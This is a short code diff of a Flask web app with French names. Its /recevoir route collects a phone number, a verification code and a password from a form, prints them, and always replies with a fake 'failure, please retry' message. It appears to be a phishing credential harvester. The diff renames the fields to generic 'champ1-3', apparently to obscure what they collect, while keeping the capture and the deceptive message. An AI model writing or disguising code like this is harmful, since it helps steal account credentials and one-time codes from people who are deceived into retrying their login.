@@ -8,12 +8,12 @@ def accueil():
 
 @app.route("/recevoir", methods=["POST"])
 def recevoir():
-    numéro_de_téléphone= request.form.get("numéro_de_téléphone")
-    code = request.form.get("code")
-    mot_de_passe = request.form.get("mot_de_passe")
+    champ1 = request.form.get("champ1")
+    champ2 = request.form.get("champ2")
+    champ3 = request.form.get("champ3")
 
-    print("numéro de téléphone :", numéro_de_téléphone)
-    print("code :", code)
-    print("mot de passe :", mot_de_passe)
+    print("Champ 1 :", champ1)
+    print("Champ 2 :", champ2)
+    print("Champ 3 :", champ3)
 
     return "Échec, veuillez réessayer ❌"
